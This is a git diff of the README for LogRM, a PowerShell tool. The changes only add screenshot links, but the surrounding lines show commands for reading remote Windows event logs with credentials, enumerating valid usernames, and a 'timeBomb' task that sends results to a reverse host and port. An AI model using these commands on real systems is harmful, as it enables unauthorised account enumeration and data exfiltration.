@@ -47,6 +47,8 @@ PS> RMLog -user <username> -pass <password> -fips <file with ips> -eventID <even
 PS> RMLog -ip 127.0.0.1 -eventID <eventID> 
 ```
 
+![alt text](https://github.com/tasox/LogRM/blob/master/example1_.png)
+
 If you use -newest parameter then you will be able to search into a specific quantity of entries and in many cases your results will be more accurate.
 
 ```
@@ -54,6 +56,8 @@ PS> RMLog -user <username> -pass <password> -ip <remote winrm ip> -newest <numbe
 PS> RMLog -user <username> -pass <password> -fips <file with ips> -newest <number>
 PS> RMLog -ip 127.0.0.1 -newest <number>
 ```
+
+![alt text](https://github.com/tasox/LogRM/blob/master/example2_.png)
 
 Providing the -users flag you will get as a result some valid usernames. The RMLog searches into these event IDs 4624,4625,4776 
 
@@ -81,6 +85,8 @@ The task is going to run now.
 ```
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
+
+
 
 The task is going to run once at specific time.
 ```
